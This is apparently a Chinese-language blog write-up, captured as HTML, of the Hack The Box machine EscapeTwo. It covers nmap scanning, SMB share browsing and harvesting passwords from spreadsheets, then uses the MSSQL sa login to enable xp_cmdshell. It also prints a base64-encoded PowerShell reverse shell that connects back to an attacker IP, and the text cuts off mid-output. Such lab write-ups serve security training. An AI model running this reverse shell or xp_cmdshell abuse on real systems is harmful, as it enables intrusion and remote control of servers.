@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/icon.jpg">
+  
+  <title>EscapeTwo | QWQ0QWQ&#39;s blog</title>
+  
+  <meta name="author" content="QWQ0QWQ" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="HTB" />
+  
+  <meta name="description" content="HTB EscapeTwonmap 扫描 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EscapeTwo">
+<meta property="og:url" content="https://qwq0qwq.github.io/2025/01/19/EscapeTwo/index.html">
+<meta property="og:site_name" content="QWQ0QWQ&#39;s blog">
+<meta property="og:description" content="HTB EscapeTwonmap 扫描 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://qwq0qwq.github.io/images/icon.jpg">
+<meta property="article:published_time" content="2025-01-19T01:14:45.000Z">
+<meta property="article:modified_time" content="2025-01-19T01:17:28.952Z">
+<meta property="article:author" content="QWQ0QWQ">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qwq0qwq.github.io/images/icon.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/cover1.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">QWQ0QWQ&#39;s blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>QWQ0QWQ&#39;s blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2025/01/19/EscapeTwo/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">EscapeTwo</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2025-01-19T01:14:45.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-01-19</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">QWQ0QWQ</span>
+                </li>
+                
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~19.45K
+                        
+                        字
+                    </li>
+                
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1737249448952"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="HTB-EscapeTwo"><a href="#HTB-EscapeTwo" class="headerlink" title="HTB EscapeTwo"></a><strong>HTB EscapeTwo</strong></h1><p>nmap 扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">└─$ nmap -sC -sV 10.10.11.51</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 15:25 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.51</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 963 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE        VERSION</span><br><span class="line">7/tcp     closed <span class="built_in">echo</span></span><br><span class="line">25/tcp    open   smtp?</span><br><span class="line">|_smtp-commands: Couldn<span class="string">&#x27;t establish connection on port 25</span></span><br><span class="line"><span class="string">53/tcp    open   domain         Simple DNS Plus</span></span><br><span class="line"><span class="string">88/tcp    open   kerberos-sec   Microsoft Windows Kerberos (server time: 2025-01-15 07:27:06Z)</span></span><br><span class="line"><span class="string">110/tcp   open   pop3?</span></span><br><span class="line"><span class="string">135/tcp   open   msrpc          Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open   netbios-ssn    Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">389/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-15T07:30:59+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Not valid before: 2024-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-06-08T17:35:00</span></span><br><span class="line"><span class="string">445/tcp   open   microsoft-ds?</span></span><br><span class="line"><span class="string">464/tcp   open   kpasswd5?</span></span><br><span class="line"><span class="string">497/tcp   closed retrospect</span></span><br><span class="line"><span class="string">593/tcp   open   ncacn_http     Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open   ssl/ldap       Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Not valid before: 2024-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-15T07:30:27+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">648/tcp   closed rrp</span></span><br><span class="line"><span class="string">801/tcp   closed device</span></span><br><span class="line"><span class="string">1054/tcp  closed brvread</span></span><br><span class="line"><span class="string">1174/tcp  closed fnet-remote-ui</span></span><br><span class="line"><span class="string">1433/tcp  open   ms-sql-s       Microsoft SQL Server 2019 15.00.2000.00; RTM</span></span><br><span class="line"><span class="string">| ms-sql-info: </span></span><br><span class="line"><span class="string">|   10.10.11.51:1433: </span></span><br><span class="line"><span class="string">|     Version: </span></span><br><span class="line"><span class="string">|       name: Microsoft SQL Server 2019 RTM</span></span><br><span class="line"><span class="string">|       number: 15.00.2000.00</span></span><br><span class="line"><span class="string">|       Product: Microsoft SQL Server 2019</span></span><br><span class="line"><span class="string">|       Service pack level: RTM</span></span><br><span class="line"><span class="string">|       Post-SP patches applied: false</span></span><br><span class="line"><span class="string">|_    TCP port: 1433</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-15T07:31:08+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span></span><br><span class="line"><span class="string">| Not valid before: 2025-01-14T18:57:28</span></span><br><span class="line"><span class="string">|_Not valid after:  2055-01-14T18:57:28</span></span><br><span class="line"><span class="string">| ms-sql-ntlm-info: </span></span><br><span class="line"><span class="string">|   10.10.11.51:1433: </span></span><br><span class="line"><span class="string">|     Target_Name: SEQUEL</span></span><br><span class="line"><span class="string">|     NetBIOS_Domain_Name: SEQUEL</span></span><br><span class="line"><span class="string">|     NetBIOS_Computer_Name: DC01</span></span><br><span class="line"><span class="string">|     DNS_Domain_Name: sequel.htb</span></span><br><span class="line"><span class="string">|     DNS_Computer_Name: DC01.sequel.htb</span></span><br><span class="line"><span class="string">|     DNS_Tree_Name: sequel.htb</span></span><br><span class="line"><span class="string">|_    Product_Version: 10.0.17763</span></span><br><span class="line"><span class="string">1500/tcp  closed vlsi-lm</span></span><br><span class="line"><span class="string">1580/tcp  closed tn-tl-r1</span></span><br><span class="line"><span class="string">2048/tcp  closed dls-monitor</span></span><br><span class="line"><span class="string">3011/tcp  closed trusted-web</span></span><br><span class="line"><span class="string">3221/tcp  closed xnm-clear-text</span></span><br><span class="line"><span class="string">3268/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-15T07:30:35+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Not valid before: 2024-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-06-08T17:35:00</span></span><br><span class="line"><span class="string">3269/tcp  open   ssl/ldap       Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span></span><br><span class="line"><span class="string">| Not valid before: 2024-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-06-08T17:35:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2025-01-15T07:30:27+00:00; -1s from scanner time.</span></span><br><span class="line"><span class="string">3814/tcp  closed neto-dcs</span></span><br><span class="line"><span class="string">3828/tcp  closed neteh</span></span><br><span class="line"><span class="string">5440/tcp  closed unknown</span></span><br><span class="line"><span class="string">5560/tcp  closed isqlplus</span></span><br><span class="line"><span class="string">5903/tcp  closed vnc-3</span></span><br><span class="line"><span class="string">7938/tcp  closed lgtomapper</span></span><br><span class="line"><span class="string">8180/tcp  closed unknown</span></span><br><span class="line"><span class="string">8200/tcp  closed trivnet1</span></span><br><span class="line"><span class="string">8873/tcp  closed dxspider</span></span><br><span class="line"><span class="string">22939/tcp closed unknown</span></span><br><span class="line"><span class="string">23502/tcp closed unknown</span></span><br><span class="line"><span class="string">32769/tcp closed filenet-rpc</span></span><br><span class="line"><span class="string">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2025-01-15T07:29:48</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   3:1:1: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 383.73 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>给了一部分机器信息</p>
+<p>MACHINE INFORMATION</p>
+<p>As is common in real life Windows pentests, you will start this box with credentials for the following account: rose &#x2F; KxEPkKe6R8su<img src="/.io//image-20250115160744649-1737249435810-1.png" alt="image-20250115160744649"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> smbclient -L //10.10.11.51/Users -U rose --option=&#x27;client min protocol=SMB2&#x27;</span><br><span class="line">Password for [WORKGROUP\rose]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        Accounting Department Disk      </span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">        Users           Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //10.10.11.51/Users -U rose --option=&#x27;client min protocol=SMB2&#x27; </span><br><span class="line">Password for [WORKGROUP\rose]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                  DR        0  Sun Jun  9 21:42:11 2024</span><br><span class="line">  ..                                 DR        0  Sun Jun  9 21:42:11 2024</span><br><span class="line">  Default                           DHR        0  Sun Jun  9 19:17:29 2024</span><br><span class="line">  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018</span><br><span class="line"></span><br><span class="line">                6367231 blocks of size 4096. 911984 blocks available</span><br><span class="line">smb: \&gt; </span><br><span class="line">           </span><br></pre></td></tr></table></figure>
+
+<p>下载下来查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat desktop.ini </span><br><span class="line">��</span><br><span class="line">[.ShellClassInfo]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找了很久的USER目录下文件，没发现什么，后面看了很久才发现有Accounting，在里面找到两个表格文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //10.10.11.51/Accounting\ Department  -U rose</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\rose]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sun Jun  9 18:52:21 2024</span><br><span class="line">  ..                                  D        0  Sun Jun  9 18:52:21 2024</span><br><span class="line">  accounting_2024.xlsx                A    10217  Sun Jun  9 18:14:49 2024</span><br><span class="line">  accounts.xlsx                       A     6780  Sun Jun  9 18:52:07 2024</span><br><span class="line"></span><br><span class="line">                6367231 blocks of size 4096. 901110 blocks available</span><br><span class="line">smb: \&gt; get accounts.xlsx</span><br><span class="line">getting file \accounts.xlsx of size 6780 as accounts.xlsx (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get accounting_2024.xlsx</span><br><span class="line">getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (5.2 KiloBytes/sec) (average 2.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>
+
+<p>找到一些账号密码</p>
+<p><img src="/.io//image-20250115200458775-1737249435810-2.png" alt="image-20250115200458775"></p>
+<table>
+<thead>
+<tr>
+<th>First Name</th>
+<th>Last Name</th>
+<th>Email</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Angela</td>
+<td>Martin</td>
+<td><a href="mailto:angela@sequel.htb">angela@sequel.htb</a></td>
+<td>angela</td>
+<td>0fwz7Q4mSpurIt99</td>
+</tr>
+<tr>
+<td>Oscar</td>
+<td>Martinez</td>
+<td><a href="mailto:oscar@sequel.htb">oscar@sequel.htb</a></td>
+<td>oscar</td>
+<td>86LxLBMgEWaKUnBG</td>
+</tr>
+<tr>
+<td>Kevin</td>
+<td>Malone</td>
+<td><a href="mailto:kevin@sequel.htb">kevin@sequel.htb</a></td>
+<td>kevin</td>
+<td>Md9Wlq1E5bZnVDVo</td>
+</tr>
+<tr>
+<td>NULL</td>
+<td>NULL</td>
+<td><a href="mailto:sa@sequel.htb">sa@sequel.htb</a></td>
+<td>sa</td>
+<td>MSSQLP@ssw0rd!</td>
+</tr>
+</tbody></table>
+<p>看到一条用户名为sa，密码为MSSQLP@ssw0rd!，很明显的提示，让我们去连mssql数据库。</p>
+<p>启用 xp_cmdshell</p>
+<p><img src="/.io//image-20250115201950861-1737249435811-5.png" alt="image-20250115201950861"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>查看数据库版本，为Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)</p>
+<p><img src="/.io//image-20250115203227982-1737249435811-6.png" alt="image-20250115203227982"></p>
+<p>看一下用户，用户为sequel\sql_svc</p>
+<p><img src="/.io//image-20250115202231261-1737249435811-3.png" alt="image-20250115202231261"></p>
+<p>查看当前目录为C:\Windows\system32</p>
+<p><img src="/.io//image-20250115205951675-1737249435811-4.png" alt="image-20250115205951675"></p>
+<p>反弹shell，运行不了，是长度过大了</p>
+<p><img src="/.io//image-20250115203934948-1737249435811-7.png" alt="image-20250115203934948"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-mssqlclient sa:MSSQLP@ssw0rd\!@10.10.11.51 </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english                                                                                                 </span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                                                                                                </span><br><span class="line">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.                                                                                    </span><br><span class="line">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.                                                                                  </span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)                                                                                                        </span><br><span class="line">[!] Press help for extra shell commands                                                                                                                     </span><br><span class="line">SQL (sa  dbo@master)&gt;                                                                                                                                       </span><br><span class="line">                        </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u &#x27;sa&#x27; -p &#x27;MSSQLP@ssw0rd!&#x27; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20250115214342467-1737249435811-8.png" alt="image-20250115214342467"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PS C:\SQL2019\ExpressAdv_ENU&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQL2019\ExpressAdv_ENU</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         6/8/2024   3:07 PM                1033_ENU_LP</span><br><span class="line">d-----         6/8/2024   3:07 PM                redist</span><br><span class="line">d-----         6/8/2024   3:07 PM                resources</span><br><span class="line">d-----         6/8/2024   3:07 PM                x64</span><br><span class="line">-a----        9/24/2019  10:03 PM             45 AUTORUN.INF</span><br><span class="line">-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML</span><br><span class="line">-a----         6/8/2024   3:07 PM             16 PackageId.dat</span><br><span class="line">-a----        9/24/2019  10:03 PM         142944 SETUP.EXE</span><br><span class="line">-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG</span><br><span class="line">-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI</span><br><span class="line">-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\SQL2019\ExpressAdv_ENU&gt; cat sql-Configuration.INI</span><br><span class="line">[OPTIONS]</span><br><span class="line">ACTION=&quot;Install&quot;</span><br><span class="line">QUIET=&quot;True&quot;</span><br><span class="line">FEATURES=SQL</span><br><span class="line">INSTANCENAME=&quot;SQLEXPRESS&quot;</span><br><span class="line">INSTANCEID=&quot;SQLEXPRESS&quot;</span><br><span 